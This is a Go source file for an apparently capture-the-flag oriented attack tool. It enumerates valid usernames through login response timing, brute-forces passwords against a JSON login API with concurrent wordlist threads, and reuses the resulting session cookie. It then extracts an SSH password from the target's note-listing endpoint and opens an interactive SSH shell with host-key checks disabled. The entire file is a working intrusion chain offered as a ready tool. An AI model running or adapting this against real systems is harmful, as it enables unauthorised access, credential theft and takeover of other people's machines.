package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type LoginRequestData struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LoginResponse struct {
	Status string `json:"status"`
}

type Note struct {
	Content string `json:"noteContent"`
}

type UserCredentials struct {
	Username string
	Password string
}

var USERNAMES_DISCOVERED []string = []string{}
var CREDENTIALS_DISCOVERED []UserCredentials = []UserCredentials{}
var SESSIONS_GRANTED http.Client = http.Client{Timeout: 30 * time.Second}

var TIMEOUT float64

// ============================================================
//
// Function Name: GrabSSHPass
//
// Author: Thomas Osgood
//
// Description:
//
//	This function is designed to contact the note/list API
//	endpoint and pull out the SSH key for the user.
//
// Input(s):
//
//	baseURL - string. base URL to use for HTTP request.
//
// Return(s):
//
//	sshpass - string. ssh password extracted from endpoint.
//	success - bool. indication of successful execution.
//	message - string. status message.
//
// ============================================================
func GrabSSHPass(baseURL string) (sshpass string, success bool, message string) {
	var notesreturned []Note = []Note{}
	var notecontent Note = Note{}

	resp, err := SESSIONS_GRANTED.Get(fmt.Sprintf("%s/api/note/list", baseURL))
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	defer resp.Body.Close()

	bodycontent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	err = json.Unmarshal(bodycontent, &notesreturned)
	if err != nil {
		return "", false, err.Error()
	}

	notecontent = notesreturned[0]
	sentencewords := strings.Split(notecontent.Content, " ")
	sshpass = sentencewords[len(sentencewords)-1]

	return sshpass, true, "SSH password grabbed"
}

// ============================================================
//
// Function Name: WordlistGenerator
//
// Author: Thomas Osgood
//
// Description:
//
//	This function is designed to loop through a wordlist
//	and feed the data into a string channel line-by-line.
//
// Input(s):
//
//	wordlist - string. file containing words to loop through.
//	c - chan string. channel to send words into.
//
// Return(s):
//
//	success - bool. indication of successful execution.
//	message - string. status message.
//
// ============================================================
func WordlistGenerator(wordlist string, c chan string) (success bool, message string) {
	defer close(c)

	fptr, err := os.Open(wordlist)
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	filescanner := bufio.NewScanner(fptr)
	filescanner.Split(bufio.ScanLines)

	for filescanner.Scan() {
		c <- filescanner.Text()
	}

	return true, "worlist looped through successfully"
}

// ============================================================
//
// Function Name: TestCreds
//
// Author: Thomas Osgood
//
// Description:
//
//	This function is designed to attempt a brute-force
//	attack against a target URL. It loops through the
//	usernames that have been discovered and saved and
//	attempts to find valid login credentials.
//
// Input(s):
//
//	targetURL - string. full URL of the login page.
//	passwordlist - string. file containng list of passwords.
//
// Return(s):
//
//	None.
//
// ============================================================
func TestCreds(targetURL string, passwordlist string) {
	var datachan chan string = make(chan string)
	var exitflag bool
	var wg *sync.WaitGroup = new(sync.WaitGroup)

	for _, username := range USERNAMES_DISCOVERED {
		go WordlistGenerator(passwordlist, datachan)
		for i := 0; i < 5; i++ {
			wg.Add(1)
			go TestPassword(targetURL, username, datachan, wg, &exitflag)
		}
		wg.Wait()
	}
	return
}

// ============================================================
//
// Function Name: TestPassword
//
// Author: Thomas Osgood
//
// Description:
//
//	This function is designed to loop through a wordlist
//	and test the usernames read from the channel.
//
// Input(s):
//
//	targetURL - string. full URL of the login page.
//	username - string. username to test creds of.
//	c - chan string. channel to get passwords from.
//	wg - *sync.WaitGroup. waitgroup the thread belongs to.
//	exitflag - *bool. indicates successful credential found.
//
// Return(s):
//
//	None.
//
// ============================================================
func TestPassword(targetURL string, username string, c chan string, wg *sync.WaitGroup, exitflag *bool) {
	defer wg.Done()
	var logindata LoginRequestData = LoginRequestData{Username: username}
	var responsedata LoginResponse = LoginResponse{}

	for password := range c {
		if *exitflag {
			fmt.Printf(ANSI_CLRLN)
			return
		}
		logindata.Password = password
		jsondata, err := json.Marshal(logindata)
		if err != nil {
			ErrMsg(err.Error())
		}

		SysMsgNB(fmt.Sprintf("Testing \"%s:%s\"", logindata.Username, logindata.Password))
		client := http.Client{Timeout: 30 * time.Second}
		req, err := http.NewRequest("POST", targetURL, bytes.NewReader(jsondata))
		if err != nil {
			ErrMsg(err.Error())
		} else {
			req.Header.Set("content-type", "application/json")
			resp, err := client.Do(req)
			if err != nil {
				ErrMsg(err.Error())
			} else {
				returnbytes, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					resp.Body.Close()
					continue
				}
				json.Unmarshal(returnbytes, &responsedata)
				if strings.ToLower(responsedata.Status) != "invalid username or password" {
					SucMsg(fmt.Sprintf("Credentials Discovered: \"%s:%s\"", username, password))
					CREDENTIALS_DISCOVERED = append(CREDENTIALS_DISCOVERED, UserCredentials{Username: username, Password: password})
					cookieurl, err := url.Parse(targetURL)
					if err != nil {
						continue
					}
					SESSIONS_GRANTED.Jar.SetCookies(cookieurl, resp.Cookies())
					*exitflag = true
					resp.Body.Close()
					return
				}
				resp.Body.Close()
			}
		}
	}
	fmt.Printf(ANSI_CLRLN)
	return
}

// ============================================================
//
// Function Name: TestPassword
//
// Author: Thomas Osgood
//
// Description:
//
//	This function is designed to test the validity of
//	a username.
//
// Input(s):
//
//	targetURL - string. full URL of the login page.
//	c - chan string. channel to get passwords from.
//	wg - *sync.WaitGroup. waitgroup the thread belongs to.
//
// Return(s):
//
//	None.
//
// ============================================================
func TestUsername(targetURL string, c chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	var logindata LoginRequestData = LoginRequestData{Password: "invalidpassword!"}

	for username := range c {
		logindata.Username = username
		timenow := time.Now()
		jsondata, err := json.Marshal(logindata)
		if err != nil {
			ErrMsg(err.Error())
		}

		SysMsgNB(fmt.Sprintf("Testing \"%s\"", logindata.Username))
		client := http.Client{Timeout: 2 * time.Second}
		req, err := http.NewRequest("POST", targetURL, bytes.NewReader(jsondata))
		if err != nil {
			ErrMsg(err.Error())
		} else {
			req.Header.Set("content-type", "application/json")
			resp, err := client.Do(req)
			if err != nil {
				ErrMsg(err.Error())
			} else {
				resp.Body.Close()
				timediff := time.Now().Sub(timenow)
				if time.Duration(timediff).Seconds() > (TIMEOUT * time.Duration(time.Second).Seconds()) {
					SucMsg(fmt.Sprintf("Username Found: \"%s\"", logindata.Username))
					USERNAMES_DISCOVERED = append(USERNAMES_DISCOVERED, username)
				}
			}
		}
	}
	return
}

// ============================================================
//
// Function Name: FindUsername
//
// Author: Thomas Osgood
//
// Description:
//
//	This function is designed to spawn multiple threads
//	used to brute-force a username.
//
// Input(s):
//
//	baseURL - string. root URL for the target.
//	wordlist - string. wordlist to use for username brute.
//	threadcount - int. number of threads to spawn for brute.
//
// Return(s):
//
//	success - bool. indication of username found.
//	message - string. status message.
//
// ============================================================
func FindUsername(baseURL string, wordlist string, threadcount int) (success bool, message string) {
	var namechan chan string = make(chan string)
	var wg *sync.WaitGroup = new(sync.WaitGroup)
	var targetURL string = fmt.Sprintf("%s/api/user/login", baseURL)

	go WordlistGenerator(wordlist, namechan)

	//============================================================
	// Spawn threadcount threads to brute force the username
	//============================================================
	for i := 0; i < threadcount; i++ {
		wg.Add(1)
		go TestUsername(targetURL, namechan, wg)
	}
	wg.Wait()

	fmt.Printf(ANSI_CLRLN)

	if len(USERNAMES_DISCOVERED) > 0 {
		message = fmt.Sprintf("%d usernames discovered", len(USERNAMES_DISCOVERED))
		success = true
	} else {
		message = "no usernames found"
		success = false
	}

	return success, message
}

// ============================================================
//
// Function Name: SSHConnection
//
// Author: Thomas Osgood
//
// Description:
//
//	This function is designed to initialize an SSH
//	connection with the target machine using a discovered
//	username and credentials. The function automatically logs
//  in with the credentials discovered and spawns a stable
//  shell the attacker can use to interact with the target.
//
// Input(s):
//
//	targetIP - string. IP address of target.
//
// Return(s):
//
//	success - bool. indication of successful SSH attempt.
//	message - string. status message.
//
// ============================================================
func SSHConnection(targetIP string, sshpassword string) (success bool, message string) {
	success = true
	message = "SSH connection successful"

	PrintChar('=', 60)
	InfMsgNB("Initializing SSH Connection")
	PrintChar('=', 60)
	fmt.Printf("\n")

	sshconfig := &ssh.ClientConfig{
		User:            CREDENTIALS_DISCOVERED[0].Username,
		Auth:            []ssh.AuthMethod{ssh.Password(sshpassword)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Minute,
	}

	connection, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", targetIP), sshconfig)
	if err != nil {
		return false, err.Error()
	}
	defer connection.Close()

	session, err := connection.NewSession()
	if err != nil {
		return false, fmt.Sprintf("Unable to create SSH session: %s", err.Error())
	}
	defer session.Close()

	modes := ssh.TerminalModes{
		ssh.ECHO:          1,
		ssh.TTY_OP_ISPEED: 14400,
		ssh.TTY_OP_OSPEED: 14400,
	}

	session.Stdin = os.Stdin
	session.Stderr = os.Stderr
	session.Stdout = os.Stdout

	// Create stable shell
	filedescriptor := int(os.Stdin.Fd())
	if terminal.IsTerminal(filedescriptor) {
		originalstate, err := terminal.MakeRaw(filedescriptor)
		if err != nil {
			ErrMsg(err.Error())
		}
		defer terminal.Restore(filedescriptor, originalstate)

		tw, th, err := terminal.GetSize(filedescriptor)
		if err != nil {
			ErrMsg(err.Error())
		}

		if err := session.RequestPty("xterm-256color", tw, th, modes); err != nil {
			return false, fmt.Sprintf("request for pseudo terminal failed: %s", err.Error())
		}
	}

	err = session.Shell()
	if err != nil {
		return false, err.Error()
	}
	session.Wait()

	fmt.Printf("\n")
	PrintChar('=', 60)
	InfMsgNB("SSH Connection Closed")
	PrintChar('=', 60)
	fmt.Printf("\n")

	return success, message
}

func PrintChar(c byte, n int) {
	fmt.Printf("\n")
	fmt.Printf(ANSI_CLRLN)
	for i := 0; i < n; i++ {
		fmt.Printf(string(c))
	}
	fmt.Printf("\n")
}

func ValidatePort(portno int) (valid bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be within range 1 - 65535"
	}

	return true, "port valid"
}

func ValidateThreadCount(threadcount int) (valid bool, message string) {
	if (threadcount < 1) || (threadcount > 50) {
		return false, "thread count must be in range 1 - 50"
	}

	return true, "thread count valid"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func main() {
	var baseURL string

	var brutelogin bool

	var message string

	var sshpassword string
	var success bool

	var targetIP string
	var targetPort int
	var threadCount int

	var wordlistp string
	var wordlistu string

	flag.StringVar(&targetIP, "i", "127.0.0.1", "target IP address")
	flag.BoolVar(&brutelogin, "l", false, "attempt to brute-force login (username + password)")
	flag.IntVar(&targetPort, "p", 80, "target port")
	flag.IntVar(&threadCount, "t", 10, "number of threads used to brute force")
	flag.StringVar(&wordlistp, "P", "passwords.txt", "wordlist to use in password brute force")
	flag.StringVar(&wordlistu, "U", "names_short.txt", "wordlist to use in username brute force")
	flag.Float64Var(&TIMEOUT, "T", 1.5, "timeout (seconds) for HTTP request.")
	flag.Parse()

	valid, message := ValidatePort(targetPort)
	if !valid {
		ErrMsg(message)
		os.Exit(1)
	}

	valid, message = ValidateThreadCount(threadCount)
	if !valid {
		ErrMsg(message)
		os.Exit(1)
	}

	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target IP: %s", targetIP))
	InfMsg(fmt.Sprintf("Target Port: %d", targetPort))
	InfMsg(fmt.Sprintf("Thread Count: %d", threadCount))
	InfMsg(fmt.Sprintf("Username Wordlist: %s", wordlistu))
	InfMsgNB(fmt.Sprintf("Password Wordlist: %s", wordlistp))
	PrintChar('=', 60)
	fmt.Printf("\n")

	baseURL = fmt.Sprintf("http://%s:%d", targetIP, targetPort)

	success, message = FindUsername(baseURL, wordlistu, threadCount)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	if brutelogin {
		sessionjar, err := cookiejar.New(nil)
		if err != nil {
			ErrMsg(err.Error())
			os.Exit(1)
		}

		SESSIONS_GRANTED.Jar = sessionjar

		TestCreds(fmt.Sprintf("%s/api/user/login", baseURL), wordlistp)

		cookieurl, err := url.Parse(baseURL)
		if err != nil {
			ErrMsg(err.Error())
			os.Exit(1)
		}
		if len(SESSIONS_GRANTED.Jar.Cookies(cookieurl)) > 0 {
			sshpassword, success, message = GrabSSHPass(baseURL)
			if !success {
				ErrMsg(message)
				os.Exit(1)
			}
			SucMsg(fmt.Sprintf("SSH Password: %s", sshpassword))
		} else {
			ErrMsg("no valid creds discovered")
			os.Exit(1)
		}

		success, message = SSHConnection(targetIP, sshpassword)
		if !success {
			ErrMsg(message)
			os.Exit(1)
		}
		SucMsg(message)
	}
	return
}

